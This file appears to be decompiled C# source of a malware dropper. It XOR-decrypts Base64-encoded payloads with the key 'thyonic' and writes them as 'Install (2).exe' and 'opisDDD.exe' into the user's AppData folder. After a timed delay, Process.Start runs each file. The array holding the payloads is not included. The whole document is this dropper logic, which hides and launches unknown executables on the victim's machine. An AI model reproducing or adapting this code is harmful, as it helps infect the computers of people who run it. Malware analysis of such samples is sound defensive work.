using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns7;

namespace ns0;

internal sealed class Class0
{
	private static string[] string_0 = new string[2] { "AppData", "AppData" };

	private static string[] string_1 = new string[2] { "0", "0" };

	private static string[] string_2 = new string[2] { "Install (2).exe", "opisDDD.exe" };


	[STAThread]
	public static void Main()
	{
		if (!Class30.smethod_3())
		{
			return;
		}
		int try000c_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int upperBound = default(int);
		int num6 = default(int);
		string text = default(string);
		int upperBound2 = default(int);
		byte[] bytes = default(byte[]);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try000c_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0014;
					case 552:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_000c;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0014;
							case 3:
								goto IL_002e;
							case 5:
							case 6:
								goto IL_003a;
							case 7:
								goto IL_004d;
							case 9:
								goto IL_0063;
							case 10:
								goto IL_0077;
							case 12:
								goto IL_008a;
							case 13:
								goto IL_009e;
							case 15:
								goto IL_00b1;
							case 16:
								goto IL_00c5;
							case 18:
							case 19:
								goto IL_00d9;
							case 4:
							case 8:
							case 11:
							case 14:
							case 17:
							case 20:
							case 21:
								goto IL_00eb;
							case 22:
								goto IL_00f8;
							case 23:
								goto IL_0110;
							case 24:
								goto IL_012b;
							case 25:
								goto IL_0148;
							case 26:
								goto IL_0153;
							case 27:
								goto IL_0182;
							case 28:
								goto IL_018d;
							default:
								goto end_IL_000c;
							case 29:
								goto end_IL_000c_2;
							}
							goto default;
						}
						IL_018d:
						num = 28;
						num5++;
						goto IL_0195;
						IL_0014:
						num = 2;
						upperBound = string_0.GetUpperBound(0);
						num6 = 0;
						goto IL_0026;
						IL_0026:
						if (num6 <= upperBound)
						{
							goto IL_002e;
						}
						goto IL_00f8;
						IL_002e:
						num = 3;
						text = string_0[num6];
						goto IL_003a;
						IL_003a:
						num = 6;
						if (Operators.CompareString(text, "AppData", false) == 0)
						{
							goto IL_004d;
						}
						goto IL_0063;
						IL_004d:
						num = 7;
						string_0[num6] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
						goto IL_00eb;
						IL_0063:
						num = 9;
						if (Operators.CompareString(text, "Favorites", false) == 0)
						{
							goto IL_0077;
						}
						goto IL_008a;
						IL_0077:
						num = 10;
						string_0[num6] = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
						goto IL_00eb;
						IL_008a:
						num = 12;
						if (Operators.CompareString(text, "MyDocuments", false) == 0)
						{
							goto IL_009e;
						}
						goto IL_00b1;
						IL_009e:
						num = 13;
						string_0[num6] = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
						goto IL_00eb;
						IL_00b1:
						num = 15;
						if (Operators.CompareString(text, "System", false) == 0)
						{
							goto IL_00c5;
						}
						goto IL_00d9;
						IL_00c5:
						num = 16;
						string_0[num6] = Environment.GetFolderPath(Environment.SpecialFolder.System);
						goto IL_00eb;
						IL_00d9:
						num = 19;
						string_0[num6] = string_0[num6];
						goto IL_00eb;
						IL_00eb:
						num = 21;
						num6++;
						goto IL_0026;
						IL_00f8:
						num = 22;
						upperBound2 = string_3.GetUpperBound(0);
						num5 = 0;
						goto IL_0195;
						IL_0195:
						if (num5 > upperBound2)
						{
							goto end_IL_000c_2;
						}
						goto IL_0110;
						IL_0110:
						num = 23;
						bytes = smethod_1(Convert.FromBase64String(string_3[num5]), "thyonic");
						goto IL_012b;
						IL_012b:
						num = 24;
						text2 = string_0[num5] + "\\" + string_2[num5];
						goto IL_0148;
						IL_0148:
						num = 25;
						File.WriteAllBytes(text2, bytes);
						goto IL_0153;
						IL_0153:
						num = 26;
						smethod_0((int)Math.Round(Conversions.ToDouble(string_1[num5]) * 1000.0 * 60.0));
						goto IL_0182;
						IL_0182:
						num = 27;
						Process.Start(text2);
						goto IL_018d;
						end_IL_000c:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try000c_dispatch = 552;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_000c_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_0(int int_0)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		while (stopwatch.ElapsedMilliseconds < int_0)
		{
			Application.DoEvents();
		}
		stopwatch.Stop();
	}

	public static byte[] smethod_1(byte[] byte_0, string string_4)
	{
		byte[] bytes = Encoding.Default.GetBytes(string_4);
		checked
		{
			int num = byte_0[byte_0.Length - 1] ^ 0x70;
			byte[] array = new byte[byte_0.Length + 1];
			int num2 = byte_0.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_4.Length - 1) ? (num3 + 1) : 0);
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
		}
	}
}